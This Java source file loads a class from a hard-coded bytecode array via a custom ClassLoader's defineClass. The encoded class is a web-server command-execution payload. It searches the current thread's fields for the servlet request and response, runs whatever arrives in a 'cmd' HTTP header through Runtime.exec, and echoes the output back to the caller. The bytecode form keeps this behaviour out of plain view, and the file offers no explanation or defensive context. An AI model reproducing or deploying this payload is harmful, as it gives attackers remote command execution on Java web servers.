package com.osword.defineclass;

import java.lang.reflect.Method;

public class byteToload extends ClassLoader {
    String myClassName = "com.osword.defineclass.dfs";
    byte[] bs = new byte[]{-54,-2,-70,-66,0,0,0,49,0,-76,10,0,23,0,80,9,0,81,0,82,8,0,83,10,0,84,0,85,9,0,45,0,86,9,0,45,0,87,7,0,88,10,0,7,0,80,9,0,45,0,89,10,0,90,0,91,10,0,45,0,92,10,0,7,0,93,10,0,7,0,94,10,0,45,0,95,7,0,96,10,0,23,0,97,10,0,21,0,98,8,0,99,11,0,15,0,100,8,0,101,7,0,102,10,0,21,0,103,7,0,104,10,0,105,0,106,7,0,107,7,0,108,11,0,25,0,109,7,0,110,10,0,111,0,112,10,0,111,0,113,10,0,114,0,115,10,0,28,0,116,8,0,117,10,0,28,0,118,10,0,28,0,119,10,0,120,0,85,10,0,120,0,121,10,0,21,0,122,10,0,123,0,124,10,0,123,0,125,10,0,21,0,126,10,0,45,0,127,7,0,-128,10,0,21,0,-127,7,0,-126,1,0,1,104,1,0,19,76,106,97,118,97,47,117,116,105,108,47,72,97,115,104,83,101,116,59,1,0,9,83,105,103,110,97,116,117,114,101,1,0,39,76,106,97,118,97,47,117,116,105,108,47,72,97,115,104,83,101,116,60,76,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,59,62,59,1,0,1,114,1,0,39,76,106,97,118,97,120,47,115,101,114,118,108,101,116,47,104,116,116,112,47,72,116,116,112,83,101,114,118,108,101,116,82,101,113,117,101,115,116,59,1,0,1,112,1,0,40,76,106,97,118,97,120,47,115,101,114,118,108,101,116,47,104,116,116,112,47,72,116,116,112,83,101,114,118,108,101,116,82,101,115,112,111,110,115,101,59,1,0,6,60,105,110,105,116,62,1,0,3,40,41,86,1,0,4,67,111,100,101,1,0,15,76,105,110,101,78,117,109,98,101,114,84,97,98,108,101,1,0,18,76,111,99,97,108,86,97,114,105,97,98,108,101,84,97,98,108,101,1,0,4,116,104,105,115,1,0,28,76,99,111,109,47,111,115,119,111,114,100,47,100,101,102,105,110,101,99,108,97,115,115,47,100,102,115,59,1,0,1,105,1,0,21,40,76,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,59,41,90,1,0,3,111,98,106,1,0,18,76,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,59,1,0,22,40,76,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,59,73,41,86,1,0,1,101,1,0,21,76,106,97,118,97,47,108,97,110,103,47,69,120,99,101,112,116,105,111,110,59,1,0,1,111,1,0,5,100,101,112,116,104,1,0,1,73,1,0,1,70,1,0,1,113,1,0,13,100,101,99,108,97,114,101,100,70,105,101,108,100,1,0,25,76,106,97,118,97,47,108,97,110,103,47,114,101,102,108,101,99,116,47,70,105,101,108,100,59,1,0,5,115,116,97,114,116,1,0,1,110,1,0,17,76,106,97,118,97,47,108,97,110,103,47,67,108,97,115,115,59,1,0,10,83,111,117,114,99,101,70,105,108,101,1,0,8,100,102,115,46,106,97,118,97,12,0,54,0,55,7,0,-125,12,0,-124,0,-123,1,0,4,102,117,99,107,7,0,-122,12,0,-121,0,-120,12,0,50,0,51,12,0,52,0,53,1,0,17,106,97,118,97,47,117,116,105,108,47,72,97,115,104,83,101,116,12,0,46,0,47,7,0,-119,12,0,-118,0,-117,12,0,71,0,65,12,0,-116,0,62,12,0,-115,0,62,12,0,61,0,62,1,0,37,106,97,118,97,120,47,115,101,114,118,108,101,116,47,104,116,116,112,47,72,116,116,112,83,101,114,118,108,101,116,82,101,113,117,101,115,116,12,0,-114,0,-113,12,0,-112,0,-111,1,0,3,99,109,100,12,0,-110,0,-109,1,0,11,103,101,116,82,101,115,112,111,110,115,101,1,0,15,106,97,118,97,47,108,97,110,103,47,67,108,97,115,115,12,0,-108,0,-107,1,0,16,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,7,0,-106,12,0,-105,0,-104,1,0,38,106,97,118,97,120,47,115,101,114,118,108,101,116,47,104,116,116,112,47,72,116,116,112,83,101,114,118,108,101,116,82,101,115,112,111,110,115,101,1,0,19,106,97,118,97,47,108,97,110,103,47,69,120,99,101,112,116,105,111,110,12,0,-103,0,-102,1,0,17,106,97,118,97,47,117,116,105,108,47,83,99,97,110,110,101,114,7,0,-101,12,0,-100,0,-99,12,0,-98,0,-97,7,0,-96,12,0,-95,0,-94,12,0,54,0,-93,1,0,2,92,65,12,0,-92,0,-91,12,0,-90,0,-89,7,0,-88,12,0,-87,0,55,12,0,-86,0,-85,7,0,-84,12,0,-83,0,-82,12,0,-81,0,-80,12,0,-79,0,-78,12,0,52,0,65,1,0,19,91,76,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,59,12,0,-77,0,-113,1,0,26,99,111,109,47,111,115,119,111,114,100,47,100,101,102,105,110,101,99,108,97,115,115,47,100,102,115,1,0,16,106,97,118,97,47,108,97,110,103,47,83,121,115,116,101,109,1,0,3,111,117,116,1,0,21,76,106,97,118,97,47,105,111,47,80,114,105,110,116,83,116,114,101,97,109,59,1,0,19,106,97,118,97,47,105,111,47,80,114,105,110,116,83,116,114,101,97,109,1,0,7,112,114,105,110,116,108,110,1,0,21,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,86,1,0,16,106,97,118,97,47,108,97,110,103,47,84,104,114,101,97,100,1,0,13,99,117,114,114,101,110,116,84,104,114,101,97,100,1,0,20,40,41,76,106,97,118,97,47,108,97,110,103,47,84,104,114,101,97,100,59,1,0,8,99,111,110,116,97,105,110,115,1,0,3,97,100,100,1,0,8,103,101,116,67,108,97,115,115,1,0,19,40,41,76,106,97,118,97,47,108,97,110,103,47,67,108,97,115,115,59,1,0,16,105,115,65,115,115,105,103,110,97,98,108,101,70,114,111,109,1,0,20,40,76,106,97,118,97,47,108,97,110,103,47,67,108,97,115,115,59,41,90,1,0,9,103,101,116,72,101,97,100,101,114,1,0,38,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,1,0,9,103,101,116,77,101,116,104,111,100,1,0,64,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,91,76,106,97,118,97,47,108,97,110,103,47,67,108,97,115,115,59,41,76,106,97,118,97,47,108,97,110,103,47,114,101,102,108,101,99,116,47,77,101,116,104,111,100,59,1,0,24,106,97,118,97,47,108,97,110,103,47,114,101,102,108,101,99,116,47,77,101,116,104,111,100,1,0,6,105,110,118,111,107,101,1,0,57,40,76,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,59,91,76,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,59,41,76,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,59,1,0,9,103,101,116,87,114,105,116,101,114,1,0,23,40,41,76,106,97,118,97,47,105,111,47,80,114,105,110,116,87,114,105,116,101,114,59,1,0,17,106,97,118,97,47,108,97,110,103,47,82,117,110,116,105,109,101,1,0,10,103,101,116,82,117,110,116,105,109,101,1,0,21,40,41,76,106,97,118,97,47,108,97,110,103,47,82,117,110,116,105,109,101,59,1,0,4,101,120,101,99,1,0,39,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,76,106,97,118,97,47,108,97,110,103,47,80,114,111,99,101,115,115,59,1,0,17,106,97,118,97,47,108,97,110,103,47,80,114,111,99,101,115,115,1,0,14,103,101,116,73,110,112,117,116,83,116,114,101,97,109,1,0,23,40,41,76,106,97,118,97,47,105,111,47,73,110,112,117,116,83,116,114,101,97,109,59,1,0,24,40,76,106,97,118,97,47,105,111,47,73,110,112,117,116,83,116,114,101,97,109,59,41,86,1,0,12,117,115,101,68,101,108,105,109,105,116,101,114,1,0,39,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,76,106,97,118,97,47,117,116,105,108,47,83,99,97,110,110,101,114,59,1,0,4,110,101,120,116,1,0,20,40,41,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,1,0,19,106,97,118,97,47,105,111,47,80,114,105,110,116,87,114,105,116,101,114,1,0,5,102,108,117,115,104,1,0,17,103,101,116,68,101,99,108,97,114,101,100,70,105,101,108,100,115,1,0,28,40,41,91,76,106,97,118,97,47,108,97,110,103,47,114,101,102,108,101,99,116,47,70,105,101,108,100,59,1,0,23,106,97,118,97,47,108,97,110,103,47,114,101,102,108,101,99,116,47,70,105,101,108,100,1,0,13,115,101,116,65,99,99,101,115,115,105,98,108,101,1,0,4,40,90,41,86,1,0,3,103,101,116,1,0,38,40,76,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,59,41,76,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,59,1,0,7,105,115,65,114,114,97,121,1,0,3,40,41,90,1,0,13,103,101,116,83,117,112,101,114,99,108,97,115,115,0,33,0,45,0,23,0,0,0,3,0,8,0,46,0,47,0,1,0,48,0,0,0,2,0,49,0,8,0,50,0,51,0,0,0,8,0,52,0,53,0,0,0,4,0,1,0,54,0,55,0,1,0,56,0,0,0,104,0,2,0,1,0,0,0,38,42,-73,0,1,-78,0,2,18,3,-74,0,4,1,-77,0,5,1,-77,0,6,-69,0,7,89,-73,0,8,-77,0,9,-72,0,10,3,-72,0,11,-79,0,0,0,2,0,57,0,0,0,30,0,7,0,0,0,17,0,4,0,18,0,12,0,19,0,16,0,20,0,20,0,21,0,30,0,22,0,37,0,23,0,58,0,0,0,12,0,1,0,0,0,38,0,59,0,60,0,0,0,10,0,61,0,62,0,1,0,56,0,0,0,80,0,2,0,1,0,0,0,26,42,-58,0,13,-78,0,9,42,-74,0,12,-103,0,5,4,-84,-78,0,9,42,-74,0,13,87,3,-84,0,0,0,2,0,57,0,0,0,18,0,4,0,0,0,26,0,14,0,27,0,16,0,30,0,24,0,31,0,58,0,0,0,12,0,1,0,0,0,26,0,63,0,64,0,0,0,10,0,52,0,65,0,1,0,56,0,0,1,85,0,6,0,3,0,0,0,-65,27,16,52,-93,0,15,-78,0,5,-58,0,10,-78,0,6,-58,0,4,-79,42,-72,0,14,-102,0,-89,-78,0,5,-57,0,81,18,15,42,-74,0,16,-74,0,17,-103,0,69,42,-64,0,15,-77,0,5,-78,0,5,18,18,-71,0,19,2,0,-57,0,10,1,-77,0,5,-89,0,42,-78,0,5,-74,0,16,18,20,3,-67,0,21,-74,0,22,-78,0,5,3,-67,0,23,-74,0,24,-64,0,25,-77,0,6,-89,0,8,77,1,-77,0,5,-78,0,5,-58,0,70,-78,0,6,-58,0,64,-78,0,6,-71,0,27,1,0,-69,0,28,89,-72,0,29,-78,0,5,18,18,-71,0,19,2,0,-74,0,30,-74,0,31,-73,0,32,18,33,-74,0,34,-74,0,35,-74,0,36,-78,0,6,-71,0,27,1,0,-74,0,37,-89,0,4,77,-79,42,27,4,96,-72,0,11,-79,0,2,0,71,0,102,0,105,0,26,0,122,0,-78,0,-75,0,26,0,2,0,57,0,0,0,78,0,19,0,0,0,34,0,18,0,35,0,19,0,37,0,26,0,38,0,44,0,39,0,51,0,40,0,64,0,41,0,71,0,44,0,102,0,48,0,105,0,46,0,106,0,47,0,110,0,52,0,122,0,55,0,-89,0,56,0,-78,0,58,0,-75,0,57,0,-74,0,59,0,-73,0,62,0,-66,0,64,0,58,0,0,0,32,0,3,0,106,0,4,0,66,0,67,0,2,0,0,0,-65,0,68,0,64,0,0,0,0,0,-65,0,69,0,70,0,1,0,10,0,71,0,65,0,1,0,56,0,0,1,36,0,2,0,12,0,0,0,-124,42,-74,0,16,77,44,-74,0,38,78,45,-66,54,4,3,54,5,21,5,21,4,-94,0,101,45,21,5,50,58,6,25,6,4,-74,0,39,1,58,7,25,6,42,-74,0,40,58,7,25,7,-74,0,16,-74,0,41,-102,0,12,25,7,27,-72,0,42,-89,0,47,25,7,-64,0,43,-64,0,43,58,8,25,8,-66,54,9,3,54,10,21,10,21,9,-94,0,22,25,8,21,10,50,58,11,25,11,27,-72,0,42,-124,10,1,-89,-1,-23,-89,0,5,58,8,-124,5,1,-89,-1,-102,44,-74,0,44,89,77,-57,-1,-123,-79,0,1,0,39,0,111,0,114,0,26,0,2,0,57,0,0,0,66,0,16,0,0,0,67,0,5,0,69,0,30,0,70,0,36,0,71,0,39,0,73,0,47,0,75,0,58,0,76,0,67,0,78,0,99,0,79,0,105,0,78,0,111,0,85,0,114,0,84,0,116,0,69,0,122,0,88,0,123,0,89,0,-125,0,91,0,58,0,0,0,62,0,6,0,99,0,6,0,72,0,64,0,11,0,39,0,77,0,68,0,64,0,7,0,30,0,86,0,73,0,74,0,6,0,0,0,-124,0,75,0,64,0,0,0,0,0,-124,0,69,0,70,0,1,0,5,0,127,0,76,0,77,0,2,0,1,0,78,0,0,0,2,0,79,
    };
    public static void main(String[] args) throws Exception {
        byteToload byteToload = new byteToload();

        Class execClass = byteToload.loadClass("com.osword.defineclass.dfs");
        Object obj = execClass.newInstance();
//        Method method = obj.getClass().getMethod("test");
//        method.invoke(obj);
    }
    @Override
    protected Class<?> findClass(String name) throws ClassNotFoundException {
        if (name == myClassName) {
            System.out.println("加载" + name + "类");
            return defineClass(myClassName, bs, 0, bs.length);
        }
        return super.findClass(name);
    }
}